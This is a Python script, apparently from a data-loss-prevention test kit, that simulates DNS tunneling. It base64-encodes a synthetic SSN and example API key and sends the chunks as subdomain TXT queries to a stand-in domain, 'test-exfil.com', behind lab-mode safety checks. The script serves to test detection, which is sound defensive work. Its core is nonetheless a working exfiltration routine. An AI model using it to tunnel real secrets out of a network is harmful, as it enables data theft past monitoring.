#!/usr/bin/env python3
"""
Synthetic DNS tunneling test
LAB USE ONLY - NEVER RUN AGAINST PRODUCTION
"""

import dns.resolver
import base64
import time
import argparse
from dlptools.safety import SafetyChecker

def test_dns_tunnel(dns_server, domain, confirm_token=None):
    """Test DNS tunneling detection"""
    SafetyChecker.verify_lab_mode()
    
    if confirm_token:
        SafetyChecker.confirm_destructive_action(confirm_token)
    
    # Create synthetic data to exfiltrate via DNS
    test_data = "Synthetic sensitive data: SSN 123-45-6789, API_KEY AKIAEXAMPLE"
    
    # Encode in base64 for DNS tunneling simulation
    encoded_data = base64.b64encode(test_data.encode()).decode()
    
    # Split into chunks that fit in DNS labels
    chunk_size = 30  # DNS label max is 63, but be conservative
    chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
    
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [dns_server]
    
    print(f"Simulating DNS tunneling with {len(chunks)} chunks...")
    
    for i, chunk in enumerate(chunks):
        try:
            # Create long subdomain for tunneling
            query = f"{chunk}.{i}.tunnel.{domain}"
            
            # TXT record query
            answers = resolver.resolve(query, 'TXT')
            
            print(f"Sent chunk {i+1}/{len(chunks)}: {query[:50]}...")
            
            # Rate limiting to avoid overwhelming
            time.sleep(0.1)
            
        except Exception as e:
            print(f"DNS query failed for chunk {i}: {e}")
    
    print("DNS tunneling test completed")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='DNS Tunneling Test - Lab Only')
    parser.add_argument('--dns-server', default='127.0.0.1',
                       help='DNS server to use for queries')
    parser.add_argument('--domain', default='test-exfil.com',
                       help='Domain for tunneling')
    parser.add_argument('--confirm-token', required=True,
                       help='Confirmation token to enable test')
    
    args = parser.parse_args()
    
    test_dns_tunnel(args.dns_server, args.domain, args.confirm_token)
